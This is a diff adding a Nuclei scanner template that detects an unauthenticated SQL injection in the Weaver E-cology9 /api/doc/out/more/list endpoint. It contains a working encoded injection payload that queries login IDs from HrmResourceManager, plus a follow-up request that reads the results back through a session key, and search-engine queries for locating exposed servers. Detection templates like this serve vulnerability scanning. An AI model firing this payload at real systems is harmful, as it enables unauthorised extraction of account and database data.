@@ -1,0 +1,56 @@
+id: weaver-ecology9-doc-list-sqli
+
+info:
+  name: Weaver E-cology9 api/doc/out/more/list SQL Injection
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    Weaver E-cology9 contains a SQL injection vulnerability in the `/api/doc/out/more/list` endpoint. A crafted request can trigger backend SQL execution and generate a temporary `sessionkey`, which can subsequently be used with the `/api/ec/dev/table/counts` endpoint to retrieve query results and confirm successful exploitation.
+  impact: |
+    Successful exploitation may allow an unauthenticated attacker to extract sensitive information from the underlying database.
+  reference:
+    - https://1diot9.github.io/2026/05/13/泛微e9分析思路/#测绘指纹
+  metadata:
+    vendor: weaver
+    product: ecology9
+    fofa-query: app="泛微-协同商务系统"
+    hunter-query: app.name=="泛微 e-cology 9.0 OA"
+  tags: weaver,ecology,ecology9,sqli,unauth
+
+http:
+  - raw:
+      - |
+        GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '"useType":"sql"')
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: sessionkey
+        internal: true
+        group: 1
+        regex:
+          - '"sessionkey":"([^"]+)"'
+
+  - raw:
+      - |
+        POST /api/ec/dev/table/counts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dataKey={{sessionkey}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body, '"status":true','"count":')
+        condition: and
+# digest: 4b0a004830460221009598b0c81099270ade0e14bc0584c1448a72fbbe1cf1cb63c30fe1d8f2c1f478022100a880826f6d6240a25f79463a52f997f509cb5d16f44357fd3a5e26190f7b30de:922c64590222798bb761d5b6d8e72950
